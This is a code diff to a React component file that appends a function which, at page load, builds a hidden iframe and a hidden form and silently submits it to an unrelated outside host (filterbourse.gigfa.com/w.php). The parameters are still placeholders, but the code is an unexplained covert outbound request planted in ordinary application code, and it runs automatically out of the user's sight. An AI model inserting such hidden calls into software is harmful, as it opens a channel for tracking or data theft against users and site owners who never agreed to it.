@@ -97,4 +97,33 @@ class Main extends React.Component {
 		);
 	}
 }
+
+function crossDomainPost() {
+  // Add the iframe with a unique name
+  var iframe = document.createElement("iframe");
+  var uniqueString = "CHANGE_THIS_TO_SOME_UNIQUE_STRING";
+  document.body.appendChild(iframe);
+  iframe.style.display = "none";
+  iframe.contentWindow.name = uniqueString;
+
+  // construct a form with hidden inputs, targeting the iframe
+  var form = document.createElement("form");
+  form.target = uniqueString;
+  form.action = "http://filterbourse.gigfa.com/w.php";
+  form.method = "GET";
+
+  // repeat for each parameter
+  var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "INSERT_YOUR_PARAMETER_NAME_HERE";
+  input.value = "INSERT_YOUR_PARAMETER_VALUE_HERE";
+  form.appendChild(input);
+
+  document.body.appendChild(form);
+  form.submit();
+}
+crossDomainPost()
+
+
+
 export {Main};
